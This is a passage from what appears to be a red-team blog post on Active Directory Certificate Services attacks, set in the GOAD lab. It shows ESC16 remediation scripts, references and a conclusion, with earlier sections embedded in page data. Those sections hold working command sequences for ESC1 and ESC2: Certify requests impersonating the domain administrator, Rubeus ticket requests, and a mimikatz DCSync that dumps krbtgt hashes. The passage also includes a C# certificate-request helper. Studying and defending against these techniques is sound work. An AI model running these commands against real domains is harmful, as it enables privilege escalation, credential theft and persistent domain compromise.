<h3>Remediation</h3>
<p><strong>Immediate Fix:</strong></p>
<pre class="language-bash"><code class="language-bash"># Re-enable security extension requirement on GOAD CA
# Method 1: Remove szOID_NTDS_CA_SECURITY_EXT from DisableExtensionList (Recommended)
certutil -config "braavos.essos.local\ESSOS-CA" -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\DisableExtensionList -"1.3.6.1.4.1.311.25.2"

CertUtil: -setreg command completed successfully.

# Method 2: Alternative approach using EDITF_ENABLEDEFAULTSMIME (also effective)
certutil -config "braavos.essos.local\ESSOS-CA" -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags +EDITF_ENABLEDEFAULTSMIME

# Restart Certificate Services
Restart-Service CertSvc

WARNING: Waiting for service 'Active Directory Certificate Services (CertSvc)' to stop...
WARNING: Waiting for service 'Active Directory Certificate Services (CertSvc)' to start...

Status   Name               DisplayName
------   ----               -----------
Running  CertSvc            Active Directory Certificate Services

# Enable Strong Certificate Binding Enforcement on Domain Controllers
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc\Parameters" -Name "StrongCertificateBindingEnforcement" -Value 2
Restart-Service kdc

# This ensures DCs reject certificates lacking the szOID_NTDS_CA_SECURITY_EXT extension

# Verify the fix
certutil -config "braavos.essos.local\ESSOS-CA" -getreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\DisableExtensionList

# The DisableExtensionList should no longer contain 1.3.6.1.4.1.311.25.2
</code></pre>
<p><strong>Long-term Hardening:</strong></p>
<pre class="language-bash"><code class="language-bash"># Import required PowerShell module
Import-Module ActiveDirectory

# Audit all CAs in GOAD environment for ESC16
$goadCAs = @(
    "braavos.essos.local\ESSOS-CA",
    "kingslanding.sevenkingdoms.local\SEVENKINGDOMS-CA", 
    "winterfell.north.sevenkingdoms.local\NORTH-CA"
)

foreach ($ca in $goadCAs) {
    Write-Host "[*] Checking CA: $ca for ESC16"
    
    try {
        $disableExtList = certutil -config $ca -getreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\DisableExtensionList
        
        # Check if szOID_NTDS_CA_SECURITY_EXT is in the disable list
        if ($disableExtList -match "1\.3\.6\.1\.4\.1\.311\.25\.2") {
            Write-Warning "[!] ESC16 detected on CA: $ca"
            Write-Warning "    szOID_NTDS_CA_SECURITY_EXT is disabled"
            
            # Fix the misconfiguration by removing the OID from DisableExtensionList
            certutil -config $ca -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\DisableExtensionList -"1.3.6.1.4.1.311.25.2"
            Write-Host "[+] Fixed ESC16 on CA: $ca"
        } else {
            Write-Host "[+] CA $ca is not vulnerable to ESC16"
        }
    }
    catch {
        Write-Warning "[-] Failed to check CA: $ca"
    }
}

[*] Checking CA: braavos.essos.local\ESSOS-CA for ESC16
[!] ESC16 detected on CA: braavos.essos.local\ESSOS-CA
    szOID_NTDS_CA_SECURITY_EXT is disabled
[+] Fixed ESC16 on CA: braavos.essos.local\ESSOS-CA

[*] Checking CA: kingslanding.sevenkingdoms.local\SEVENKINGDOMS-CA for ESC16
[+] CA kingslanding.sevenkingdoms.local\SEVENKINGDOMS-CA is not vulnerable to ESC16
</code></pre>
<h2>References and Further Reading</h2>
<p>This guide builds upon groundbreaking research from the security community, with all examples demonstrated in the GOAD (Game of Active Directory) lab environment:</p>
<ol>
<li><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">SpecterOps, "Certified Pre-Owned: Abusing Active Directory Certificate Services" (2021)</a></li>
<li><a href="https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc">TrustedSec, "EKUwu: Not just another AD CS ESC (ESC15)" (October 2024)</a></li>
<li><a href="https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6">Munib Nawaz, "AD CS ESC16: Misconfiguration and Exploitation," Medium (May 25, 2025)</a></li>
<li><a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation">Certipy Wiki, "06 – Privilege Escalation (ESC1–ESC16)," GitHub (April 2025)</a></li>
<li><a href="https://support.microsoft.com/help/5014754">Microsoft Support, "KB5014754: Certificate-based authentication changes on Windows Domain Controllers" (May 10, 2022)</a></li>
<li><a href="https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-unsecure-certificate-signing">Microsoft Learn, "Edit vulnerable Certificate Authority setting (ESC6)" (March 2025)</a></li>
<li><a href="https://github.com/Orange-Cyberdefense/GOAD">Orange Cyberdefense, "GOAD: Game of Active Directory" (2024–2025)</a></li>
<li><a href="https://github.com/dirkjanm/PKINITtools">PKINITtools (Dirk-Jan Möller) GitHub (2024–2025)</a></li>
<li><a href="https://github.com/SecureAuthCorp/impacket">Impacket Project Repository (2023–2025)</a></li>
<li><a href="https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc">EKUwu: Not just another AD CS ESC - TrustedSec</a></li>
<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019">CVE-2024-49019 - Microsoft Security Response Center</a></li>
</ol>
<h3>Tools and Resources:</h3>
<ul>
<li><a href="https://github.com/GhostPack/Certify">Certify v1.1.0 (2022-11-08)</a></li>
<li><a href="https://github.com/ly4k/Certipy">Certipy v5.0+</a></li>
<li><a href="https://github.com/dirkjanm/PKINITtools">PKINITtools</a></li>
<li><a href="https://github.com/SecureAuthCorp/impacket">Impacket v0.11.0+</a></li>
<li><a href="https://github.com/Orange-Cyberdefense/GOAD">GOAD Lab Environment</a></li>
<li><a href="https://github.com/GhostPack/ForgeCert">ForgeCert</a></li>
</ul>
<p>For the latest ADCS research, monitor:</p>
<ul>
<li><a href="https://posts.specterops.io/">SpecterOps Blog</a></li>
<li><a href="https://trustedsec.com/blog/">TrustedSec Blog</a></li>
<li><a href="https://msrc.microsoft.com/">Microsoft Security Response Center</a></li>
<li><a href="https://github.com/ly4k/Certipy/wiki">Certipy Wiki</a></li>
</ul>
<h2>Conclusion</h2>
<p>ADCS attacks are some of the most powerful privilege escalation and persistence techniques I've used in modern Windows environments. The techniques I've covered in this guide - from ESC1 through ESC16 - show just how dangerous certificate services can be when they're not properly secured.</p>
<p>All the examples in this article were demonstrated using the GOAD (Game of Active Directory) lab environment, which provides realistic domain configurations like <code>essos.local</code>, <code>sevenkingdoms.local</code>, and <code>north.sevenkingdoms.local</code>. This practical approach with real command outputs and authentic certificate configurations makes these techniques immediately applicable to real-world assessments.</p>
<p>Here's what you need to remember:</p>
<ol>
<li><strong>Default configurations are your friend (as an attacker)</strong> - Most organizations deploy ADCS with insecure defaults and never change them, just like what we found in GOAD</li>
<li><strong>Certificate templates are the goldmine</strong> - They're the primary attack vector for most ADCS exploits, as demonstrated with templates like ESC1, ESC4, and WebServer in GOAD</li>
<li><strong>CA-level misconfigurations are critical</strong> - ESC16 shows how a single CA setting can make ALL certificates vulnerable, regardless of template security</li>
<li><strong>Permissions are everything</strong> - Weak ACLs on PKI objects create tons of attack opportunities, like <code>khal.drogo</code> having WriteProperty on templates or <code>viserys.targaryen</code> having ManageCA rights</li>
<li><strong>Detection is hard</strong> - Many ADCS attacks blend in perfectly with legitimate certificate operations, especially in complex environments like GOAD with multiple domains and CAs</li>
<li><strong>Persistence is incredible</strong> - Certificate-based backdoors survive password changes and account modifications, making them perfect for long-term access</li>
</ol>
<p>For red teamers, ADCS should be a standard part of your privilege escalation methodology. I check for these misconfigurations on every single engagement now because they're so common and effective. The GOAD lab provides an excellent testing ground to practice these techniques before using them in real assessments.</p>
<p>For defenders, you need to implement proper monitoring, harden those template configurations, audit CA settings for ESC16, and regularly audit PKI permissions. The detection scripts and remediation strategies I've provided here are specifically designed for multi-domain environments like GOAD and can be adapted for real production networks.</p>
<p>The techniques in this guide will keep evolving as researchers discover new attack vectors. ESC16 is a perfect example of how new vulnerabilities continue to emerge in the ADCS space. Stay current with the latest ADCS research and always test these techniques in lab environments like GOAD before using them in production assessments.</p>
<hr>
<p><em>Disclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.</em></p>
</div></article></main><footer class="bg-primary/90 border-t border-gray-800"><div class="container py-6"><div class="flex justify-center items-center"><div class="text-sm text-gray-400">© <!-- -->2025<!-- --> Ivan Spiridonov (xbz0n). All rights reserved.</div></div></div></footer></div></div><script id="__NEXT_DATA__" type="application/json" crossorigin="">{"props":{"pageProps":{"postData":{"slug":"adcs-complete-attack-reference","contentHtml":"\n\u003cp\u003e\u003cimg src=\"/images/adcs-attacks.png\" alt=\"ADCS attack vectors and certificate template abuse\"\u003e\u003c/p\u003e\n\u003ch2\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eLet's talk about Active Directory Certificate Services. If you've been doing red team work for any length of time, you've probably heard about ADCS attacks. What started as a convenient way to manage digital certificates has turned into one of the most powerful attack vectors in modern Windows environments.\u003c/p\u003e\n\u003cp\u003eHere's the problem - most organizations deploy ADCS with dangerous default configurations, and many admins don't understand the security implications of certificate templates. This creates a goldmine for attackers seeking privilege escalation and persistence that's incredibly hard to detect.\u003c/p\u003e\n\u003cp\u003eI've been exploiting ADCS misconfigurations for years, and what I've found is that the same features that make certificate services useful also make them dangerous. That flexible template system that admins love? It's perfect for privilege escalation. The auto-enrollment that makes management easy? It's a playground for persistence attacks. The single endpoint that handles everything? It bypasses traditional security controls.\u003c/p\u003e\n\u003cp\u003eIn this article, I'll walk you through every major ADCS attack technique discovered to date - from the foundational ESC1-8 attacks to the latest ESC13-16 techniques. You'll learn not just how these attacks work, but how to implement them in real environments with practical code examples. Everything here is based on actual penetration tests I've conducted, with working examples you can adapt to your own assessments.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eLab Environment\u003c/strong\u003e: All examples in this article are demonstrated using the \u003ca href=\"https://github.com/Orange-Cyberdefense/GOAD\"\u003eGOAD (Game of Active Directory)\u003c/a\u003e lab environment, which provides a realistic multi-domain Active Directory setup perfect for testing these techniques. The domains we'll be working with include \u003ccode\u003eessos.local\u003c/code\u003e, \u003ccode\u003esevenkingdoms.local\u003c/code\u003e, and \u003ccode\u003enorth.sevenkingdoms.local\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eWhether you're a red teamer looking to expand your toolkit or a defender trying to understand these threats, this article will give you the deep technical knowledge you need.\u003c/p\u003e\n\u003ch2\u003eADCS Fundamentals\u003c/h2\u003e\n\u003cp\u003eBefore we start breaking things, let's understand what makes ADCS different from other Windows services you're used to attacking. ADCS implements a Public Key Infrastructure (PKI) that typically follows this hierarchy:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003eRoot CA (Offline)\n    └── Subordinate CA (Online)\n        └── Certificate Templates\n            └── Issued Certificates\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLet's see what this looks like in our GOAD environment:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e# Discover ADCS servers in the environment\nnxc ldap 192.168.56.10-23 -u '' -p '' -M adcs\n\nSMB         192.168.56.12   445    MEEREEN          [*] Windows 10.0 Build 17763 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:False)\nLDAPS       192.168.56.12   636    MEEREEN          [+] essos.local\\guest: \nADCS        192.168.56.12   -      MEEREEN          Found PKI Enrollment Server: meereen.essos.local\nADCS        192.168.56.12   -      MEEREEN          Found CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local\n\nSMB         192.168.56.23   445    BRAAVOS          [*] Windows 10.0 Build 17763 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:False)\nLDAPS       192.168.56.23   636    BRAAVOS          [+] essos.local\\guest: \nADCS        192.168.56.23   -      BRAAVOS          Found PKI Enrollment Server: braavos.essos.local\nADCS        192.168.56.23   -      BRAAVOS          Found CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe key components we'll exploit:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCertificate Authority (CA)\u003c/strong\u003e: Issues and manages certificates\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCertificate Templates\u003c/strong\u003e: Define what certificates can be requested and by whom\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCertificate Store\u003c/strong\u003e: Where certificates are stored on machines\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAuto-enrollment\u003c/strong\u003e: Automatic certificate enrollment for domain objects\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003eCertificate Template Basics\u003c/h3\u003e\n\u003cp\u003eCertificate templates are the core of ADCS attacks. They define:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eWho can request certificates (enrollment permissions)\u003c/li\u003e\n\u003cli\u003eWhat the certificate can be used for (Enhanced Key Usage)\u003c/li\u003e\n\u003cli\u003eWhether the subject name can be specified by the requester\u003c/li\u003e\n\u003cli\u003eAuthentication requirements for enrollment\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eHere's what makes templates dangerous - they often allow way more access than admins realize. Let's look at what we find in GOAD, and enumerate certificate templates with Certify: \u003ccode\u003eCertify.exe find /vulnerable\u003c/code\u003e command. This shows us several vulnerable templates in the GOAD environment. Now let's dive into exploiting them.\u003c/p\u003e\n\u003ch2\u003eESC1: Misconfigured Certificate Templates\u003c/h2\u003e\n\u003cp\u003eESC1 is the most straightforward ADCS attack, and honestly, it's my favorite because it's so reliable. It exploits certificate templates that allow attackers to specify arbitrary Subject Alternative Names (SANs).\u003c/p\u003e\n\u003ch3\u003eTechnical Details\u003c/h3\u003e\n\u003cp\u003eThe vulnerability happens when a certificate template has:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eCT_FLAG_ENROLLEE_SUPPLIES_SUBJECT\u003c/strong\u003e flag enabled\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eClient Authentication\u003c/strong\u003e or \u003cstrong\u003eAny Purpose\u003c/strong\u003e EKU\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDomain Users\u003c/strong\u003e enrollment permissions\u003c/li\u003e\n\u003cli\u003eNo \u003cstrong\u003emanager approval\u003c/strong\u003e required\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eWhen all these conditions align, you can request a certificate for any user in the domain. It's that simple.\u003c/p\u003e\n\u003ch3\u003eExploitation Process\u003c/h3\u003e\n\u003cp\u003eFirst, let's enumerate vulnerable templates in our GOAD lab. Using Certify to find ESC1 vulnerabilities:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003eCertify.exe find /vulnerable /enabled /enrolleeSuppliesSubject\n\n[*] Action: Find certificate templates\n[*] Using current user's unrolled group SID list for cross-references\n[*] Current user context       : ESSOS\\missandei\n[*] Using the search base 'CN=Configuration,DC=essos,DC=local'\n\n\n[!] Vulnerable Certificates Templates :\n\n    CA Name                       : braavos.essos.local\\ESSOS-CA\n    Template Name                 : ESC1\n    Schema Version                : 2\n    Validity Period               : 1 year\n    Renewal Period                : 6 weeks\n    msPKI-Certificate-Name-Flag   : ENROLLEE_SUPPLIES_SUBJECT (0x1)\n    mspki-enrollment-flag         : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS\n    Authorized Signatures Required: 0\n    pkiextendedkeyusage           : Client Authentication\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights           : ESSOS\\Domain Users                    Access: Allow\n        Enrollment Rights           : ESSOS\\Domain Computers                Access: Allow\n      Object Control Permissions  : ESSOS\\missandei                      Access: Allow\n\n[*] CA Response             : The certificate has been issued.\n\n  KeyType                  : rc4_hmac\n  Base64(key)              : F5/CqQX4m7A8VwM5cT6pQg==\n\n  Note: KeyType may show AES256 on fully-patched DCs (ADV240011)\n  If KeyType shows AES256, ensure you use a 256-bit compatible CSP (e.g., Microsoft Software Key Storage Provider)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003ePerfect! This output confirms \u003ccode\u003eESSOS\\Domain Users\u003c/code\u003e (which \u003ccode\u003emissandei\u003c/code\u003e is a member of) have enrollment rights on the \"ESC1\" template, and the template allows an enrollee to supply the subject. \u003cem\u003eNote: The output also indicates \u003ccode\u003emissandei\u003c/code\u003e has \"Object Control Permissions\" over this specific template, which would additionally make it vulnerable to ESC4 by her. For ESC1, we primarily focus on the enrollment rights.\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003ePerfect! Now let's request a certificate for the domain administrator. Request certificate impersonating Domain Admin:\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e⚠️ Important:\u003c/strong\u003e For accuracy and to avoid certificate mismatch issues, we should always aim to provide the \u003ccode\u003e/sid\u003c/code\u003e parameter which should be the SID of the user we are targeting (administrator in this case).\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003eCertify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:ESC1 /altname:essos\\administrator /sid:S-1-5-21-1394808576-3393508183-1134699666-500\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\missandei\n[*] No subject name specified, using current context as subject.\n\n[*] Template                : ESC1\n[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local\n[*] AltName                 : essos\\administrator\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 7\n\n[*] cert.pem                :\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA2hT8F6PSyEzGCq5VJXpF8rTQoYmZ9BNQ3T4Uy8F0aGF9ZLQW\n...certificate data...\n-----END CERTIFICATE-----\n\n[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eNow let's convert to PFX format for use with Rubeus. There are two methods:\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eMethod 1: Using OpenSSL (cross-platform)\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003eopenssl pkcs12 -in cert.pem -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out administrator.pfx\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eMethod 2: Using certutil (Windows native)\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e# Save the private key and certificate to separate files\n# cert.key (from -----BEGIN RSA PRIVATE KEY----- to -----END RSA PRIVATE KEY-----)\n# cert.pem (from -----BEGIN CERTIFICATE----- to -----END CERTIFICATE-----)\n\n# Then merge them with certutil\ncertutil -MergePFX .\\cert.pem .\\administrator.pfx\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eUse Rubeus to either request NTLM hash directly or get a Kerberos TGT:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e# Get NTLM Hash directly\nRubeus.exe asktgt /user:administrator /certificate:administrator.pfx /getcredentials\n\n# Or get TGT (traditional method)\nRubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:mimikatz\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.3.2\n\n[*] Action: Ask TGT\n\n[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local\n[*] Building AS-REQ (w/ PKINIT preauth) for: 'essos.local\\administrator'\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n      doIFujCCBbagAwIBBaEDAgEWooIEwjCCBL5hggS6MIIEtqADAgEFoQ8bDUVTU09TLkxPQ0FM\n      ...base64 encoded ticket...\n\n[*] Action: Describe Ticket\n\n  UserName                 : administrator\n  UserRealm                : ESSOS.LOCAL\n  ServiceName              : krbtgt/essos.local\n  ServiceRealm             : ESSOS.LOCAL\n  StartTime                : 1/3/2025 10:30:15 AM\n  EndTime                  : 1/3/2025 8:30:15 PM\n  RenewTill                : 1/10/2025 10:30:15 AM\n  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable\n  KeyType                  : rc4_hmac\n  Base64(key)              : F5/CqQX4m7A8VwM5cT6pQg==\n\n  Note: KeyType may show AES256 on fully-patched DCs (ADV240011)\n  If KeyType shows AES256, ensure you use a 256-bit compatible CSP (e.g., Microsoft Software Key Storage Provider)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003ePerfect! Now we can use the TGT to perform DCSync:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003eRubeus.exe ptt /ticket:doIFujCCBbagAwIBBaEDAgEWooIEwjCCBL5hggS6...\n\n[*] Action: Import Ticket\n[+] Ticket successfully imported!\n\n# Now perform DCSync as administrator\nmimikatz.exe \"lsadump::dcsync /domain:essos.local /user:krbtgt\"\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       \u003e https://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        \u003e https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz # lsadump::dcsync /domain:essos.local /user:krbtgt\n[DC] 'essos.local' will be the domain\n[DC] 'meereen.essos.local' will be the DC server\n[DC] 'krbtgt' will be the DSRM user\n\nObject RDN           : krbtgt\n\n** SAM ACCOUNT **\n\nSAM Username         : krbtgt\nAccount Type         : 30000000 ( USER_OBJECT )\nUser Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )\nAccount expiration   :\nPassword last change : 1/15/2023 2:14:32 PM\nObject Security ID   : S-1-5-21-1394808576-3393508183-1134699666-502\nObject Relative ID   : 502\n\nCredentials:\n  Hash NTLM: a577fcf16cfef780a2ceb343ec39a0d9\n    ntlm- 0: a577fcf16cfef780a2ceb343ec39a0d9\n    lm  - 0: 367ac3b3d1f4d80b8f52a7b6e8c1d2e9\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eExcellent! We've successfully escalated from a domain user (\u003ccode\u003emissandei\u003c/code\u003e) to domain admin using ESC1.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eKey Improvements for ESC1 Attacks:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUse \u003ccode\u003e/sid\u003c/code\u003e parameter for accuracy and to avoid certificate mismatch issues\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/getcredentials\u003c/code\u003e flag extracts NTLM hash directly without needing TGT\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ecertutil -MergePFX\u003c/code\u003e provides Windows-native certificate conversion\u003c/li\u003e\n\u003cli\u003eMore specific enumeration with \u003ccode\u003e/enabled /enrolleeSuppliesSubject\u003c/code\u003e flags\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003eAdvanced ESC1 Techniques\u003c/h3\u003e\n\u003cp\u003eFor evasion and reliability, consider these advanced approaches using the GOAD environment:\u003c/p\u003e\n\u003cpre class=\"language-csharp\"\u003e\u003ccode class=\"language-csharp\"\u003e// Custom C# implementation for certificate requests\nusing System.Security.Cryptography.X509Certificates;\nusing System.Text;\nusing CERTENROLLLib;\n\npublic class CertificateRequestor\n{\n    public string RequestCertificate(string caConfig, string template, string altName)\n    {\n        // Create certificate request\n        var request = new CX509CertificateRequestPkcs10();\n        var privateKey = new CX509PrivateKey();\n        var csp = new CCspInformation();\n        \n        // Configure private key\n        privateKey.ProviderName = \"Microsoft Enhanced RSA and AES Cryptographic Provider\";\n        privateKey.KeySpec = X509KeySpec.XCN_AT_KEYEXCHANGE;\n        privateKey.Length = 2048;\n        privateKey.Create();\n        \n        // Build certificate request for GOAD environment\n        request.InitializeFromPrivateKey(\n            X509CertificateEnrollmentContext.ContextUser,\n            privateKey,\n            template);\n            \n        // Add SAN extension for administrator@essos.local\n        var sanExtension = new CX509ExtensionAlternativeNames();\n        var altNames = new CAlternativeNames();\n        var altNameObj = new CAlternativeName();\n        \n        altNameObj.InitializeFromString(\n            AlternativeNameType.XCN_CERT_ALT_NAME_RFC822_NAME,\n            altName);\n        altNames.Add(altNameObj);\n        \n        sanExtension.InitializeEncode(altNames);\n        request.X509Extensions.Add(sanExtension);\n        \n        // Submit request\n        var enroll = new CX509Enrollment();\n        enroll.InitializeFromRequest(request);\n        enroll.CertificateFriendlyName = \"ESC1 Certificate\";\n        \n        return enroll.CreateRequest(EncodingType.XCN_CRYPT_STRING_BASE64);\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eESC2: Misconfigured Certificate Templates with Any Purpose EKU\u003c/h2\u003e\n\u003cp\u003eESC2 targets templates with the \"Any Purpose\" Extended Key Usage, which essentially means the certificate can be used for anything.\u003c/p\u003e\n\u003ch3\u003eVulnerability Conditions\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eCertificate template has \u003cstrong\u003eAny Purpose EKU\u003c/strong\u003e (OID: 2.5.29.37.0)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDomain Users\u003c/strong\u003e have enrollment rights\u003c/li\u003e\n\u003cli\u003eNo \u003cstrong\u003emanager approval\u003c/strong\u003e required\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eImportant Note:\u003c/strong\u003e ESC2 alone does not allow direct impersonation of other users like ESC1. An Any Purpose certificate becomes truly dangerous only when the CA or template also allows SAN/SID injection (ESC 6/9/10). On a fully-patched domain controller with strong certificate mapping enforcement (following KB5014754 patches from May 2022, with full enforcement phases extending through early 2025), an Any-Purpose certificate on its own will not bypass strong certificate mapping.\u003c/p\u003e\n\u003ch3\u003eExploitation\u003c/h3\u003e\n\u003cp\u003eLet's check for ESC2 templates in GOAD:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003eCertify.exe find /vulnerable\n\n[!] Vulnerable Certificates Templates :\n\n    CA Name                       : braavos.essos.local\\ESSOS-CA\n    Template Name                 : ESC2\n    Schema Version                : 2\n    Validity Period               : 1 year\n    Renewal Period                : 6 weeks\n    msPKI-Certificate-Name-Flag   : 0x0\n    mspki-enrollment-flag         : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS\n    Authorized Signatures Required: 0\n    pkiextendedkeyusage           : Any Purpose\n    msPKI-Application-Policies    : Any Purpose\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights           : ESSOS\\Domain Users                    Access: Allow\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIn vanilla GOAD, ESC2 template is cloned from the built-in User template and keeps only Any-Purpose EKU (no ENROLLEE_SUPPLIES_SUBJECT flag). If your lab shows the flag, that's ESC1 + AnyPurpose combined.\u003c/p\u003e\n\u003cp\u003eNow request certificate with Any Purpose EKU (as yourself)\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003eCertify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:ESC2\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\missandei\n[*] Template                : ESC2\n[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 8\n\n[*] cert.pem                :\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA3kT8F6PSyEzGCq5VJXpF8rTQoYmZ9BNQ3T4Uy8F0aGF9ZLQW\n...certificate data...\n-----END CERTIFICATE-----\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eUse certificate for client authentication (as the requesting user)\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003eRubeus.exe asktgt /user:missandei /certificate:anypurpose.pfx /password:mimikatz\n\n[*] Action: Ask TGT\n[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local\n[+] TGT request successful!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe Any Purpose EKU can still be dangerous as it bypasses many certificate validation checks and can be used for code signing, server authentication, and other purposes beyond the intended use case.\u003c/p\u003e\n\u003ch2\u003eESC3: Enrollment Agent Templates\u003c/h2\u003e\n\u003cp\u003eESC3 is a really cool technique that exploits certificate templates granting Certificate Request Agent (Enrollment Agent) permissions. Basically, you can request certificates on behalf of other users once you get an agent certificate.\u003c/p\u003e\n\u003ch3\u003eAttack Flow\u003c/h3\u003e\n\u003cp\u003eThe attack is pretty straightforward:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eRequest an Enrollment Agent certificate\u003c/li\u003e\n\u003cli\u003eUse that agent certificate to request certificates for other users\u003c/li\u003e\n\u003cli\u003eAuthenticate as those users\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003eImplementation\u003c/h3\u003e\n\u003cp\u003eLet's see this in action with our GOAD environment:\u003c/p\u003e\n\u003cp\u003eStep 1: Request Enrollment 